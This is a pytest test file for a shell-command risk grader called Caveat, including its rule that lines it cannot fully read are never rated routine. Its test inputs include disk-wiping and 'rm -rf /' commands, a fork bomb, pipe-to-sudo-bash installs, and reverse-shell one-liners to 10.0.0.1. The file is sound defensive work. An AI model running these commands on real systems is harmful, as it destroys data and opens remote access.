"""
The verdict, and the ceiling over it.

The ceiling is the thing worth protecting with tests: it is a single rule — a
line Caveat could not fully read is never ROUTINE — and it is exactly the kind
of rule that gets quietly relaxed later to make a demo look tidier.
"""

import os

import pytest

from caveat.core.assess import CEILING_NOTE, assess, read_command
from caveat.core.lexer import lex
from caveat.core.model import Severity, Verdict, worse

SAMPLES = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
                       "samples")


def verdict(source):
    return read_command(source).verdict


# --- the four words ---------------------------------------------------------

@pytest.mark.parametrize("source", [
    "sudo rm -rf / --no-preserve-root",
    "rm -rf /",
    "sudo dd if=/dev/zero of=/dev/sda bs=1M",
    "mkfs.ext4 /dev/sdb1",
    ":(){ :|:& };:",
    "rm -rf $HOME",
])
def test_irreversible_loss_is_destructive(source):
    assert verdict(source) is Verdict.DESTRUCTIVE


@pytest.mark.parametrize("source", [
    "curl -fsSL https://example.com/i.sh | sudo bash",
    "echo aGk= | base64 -d | sh",
    "nc -e /bin/sh 10.0.0.1 4444",
    "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
    "history -c && unset HISTFILE",
])
def test_serious_but_recoverable_is_risky(source):
    assert verdict(source) is Verdict.RISKY


@pytest.mark.parametrize("source", [
    "sudo chmod -R 777 /var/www",
    "sudo apt install -y nginx",
    "ssh -o StrictHostKeyChecking=no user@host",
    "rm -rf build/",
])
def test_a_real_hazard_is_worth_a_look(source):
    assert verdict(source) is Verdict.WORTH_A_LOOK


@pytest.mark.parametrize("source", [
    "ls -l",
    "ps aux | grep nginx | awk '{print $2}'",
    "curl -sL https://example.com/f.tar.gz -o f.tar.gz",
    "cat /etc/hostname",
])
def test_a_clean_recognised_line_is_routine(source):
    assert verdict(source) is Verdict.ROUTINE


def test_an_alert_outranks_any_number_of_notices():
    assert verdict("sudo rm -rf / ; sleep 1 &") is Verdict.DESTRUCTIVE


def test_two_warnings_add_up_to_risky():
    assert verdict("chmod 777 /srv && curl -k https://x -o f") is Verdict.RISKY


# --- the ceiling ------------------------------------------------------------

def test_an_unknown_command_cannot_be_routine():
    assert verdict("frobnicate --wibble") is Verdict.WORTH_A_LOOK


def test_the_headline_says_why_it_was_capped():
    reading = read_command("frobnicate --wibble")
    assert "no entry for frobnicate" in reading.headline


def test_unclosed_quoting_cannot_be_routine():
    reading = read_command("echo 'half a line")
    assert reading.verdict is Verdict.WORTH_A_LOOK
    assert "quoting does not close" in reading.headline


def test_a_command_from_a_variable_cannot_be_routine():
    reading = read_command("$CMD --go")
    assert reading.verdict is not Verdict.ROUTINE
    assert "built at run time" in reading.headline


def test_the_ceiling_only_raises_and_never_lowers():
    reading = read_command("sudo rm -rf / && frobnicate")
    assert reading.verdict is Verdict.DESTRUCTIVE


def test_a_function_definition_does_not_trip_the_unknown_ceiling():
    assert read_command("greet(){ echo hi; }; greet").verdict is Verdict.ROUTINE


def test_worse_picks_the_more_serious_of_two():
    assert worse(Verdict.ROUTINE, Verdict.RISKY) is Verdict.RISKY
    assert worse(Verdict.DESTRUCTIVE, Verdict.WORTH_A_LOOK) is \
        Verdict.DESTRUCTIVE


# --- the honesty note -------------------------------------------------------

def test_every_reading_carries_the_ceiling_note():
    for source in ("ls", "rm -rf /", "", "frobnicate"):
        assert read_command(source or "ls").ceiling_note == CEILING_NOTE


def test_the_ceiling_note_says_what_caveat_cannot_know():
    for phrase in ("aliases", "PATH", "never runs", "ROUTINE is not permission"):
        assert phrase in CEILING_NOTE


def test_the_ceiling_note_never_promises_safety():
    assert "safe" not in CEILING_NOTE.lower()


@pytest.mark.parametrize("word", ["ROUTINE", "WORTH A LOOK", "RISKY",
                                  "DESTRUCTIVE"])
def test_the_four_labels_are_the_four_words(word):
    assert word in {v.label for v in Verdict}


def test_a_verdict_speaks_in_a_severity_voice():
    assert Verdict.ROUTINE.severity is Severity.GOOD
    assert Verdict.DESTRUCTIVE.severity is Severity.ALERT


# --- the shape of a reading -------------------------------------------------

def test_there_is_one_view_per_top_level_stage():
    reading = read_command("a | b && c")
    assert len(reading.views) == len(reading.script.stages) == 3


def test_a_view_is_tinted_by_the_worst_finding_on_its_stage():
    reading = read_command("curl -fsSL https://x/i.sh | sudo bash")
    assert reading.views[1].severity is Severity.ALERT


def test_a_stage_that_runs_unread_input_is_marked():
    reading = read_command("curl -s https://x | sh")
    assert reading.views[1].runs_unread is True
    assert reading.views[0].runs_unread is False


def test_an_elevated_stage_is_marked():
    reading = read_command("ls | sudo tee /etc/x")
    assert reading.views[1].elevated is True


def test_a_quiet_line_leaves_every_view_good():
    reading = read_command("ls -l")
    assert all(v.severity is Severity.GOOD for v in reading.views)


def test_explanations_cover_nested_stages_as_well_as_views():
    reading = read_command("bash -c 'rm -rf /tmp/x'")
    assert len(reading.views) == 1
    assert len(reading.explanations) == 2


def test_counts_tally_the_findings():
    reading = read_command("curl -fsSL https://x/i.sh | sudo bash")
    assert sum(reading.counts().values()) == len(reading.findings)


def test_the_worst_severity_is_reported():
    assert read_command("rm -rf /").worst is Severity.ALERT
    assert read_command("ls").worst is Severity.GOOD


def test_an_empty_script_still_reads():
    reading = assess(lex(""))
    assert reading.verdict is Verdict.ROUTINE and reading.views == []


# --- the samples ------------------------------------------------------------

@pytest.mark.parametrize("name,expected", [
    ("routine-download.sh", Verdict.ROUTINE),
    ("benign-pipeline.sh", Verdict.ROUTINE),
    ("log-triage.sh", Verdict.ROUTINE),
    ("permissions-fix.sh", Verdict.WORTH_A_LOOK),
    ("install-script.sh", Verdict.RISKY),
    ("obfuscated-payload.sh", Verdict.RISKY),
    ("wipe-the-disk.sh", Verdict.DESTRUCTIVE),
])
def test_each_sample_lands_where_it_is_meant_to(name, expected):
    with open(os.path.join(SAMPLES, name), encoding="utf-8") as handle:
        assert read_command(handle.read()).verdict is expected


def test_the_samples_span_the_whole_range():
    found = set()
    for name in os.listdir(SAMPLES):
        if name.endswith(".sh"):
            with open(os.path.join(SAMPLES, name), encoding="utf-8") as handle:
                found.add(read_command(handle.read()).verdict)
    assert found == set(Verdict)


@pytest.mark.parametrize("name", sorted(
    n for n in os.listdir(SAMPLES) if n.endswith(".sh")))
def test_every_sample_reads_without_raising(name):
    with open(os.path.join(SAMPLES, name), encoding="utf-8") as handle:
        reading = read_command(handle.read())
    assert reading.headline and reading.views
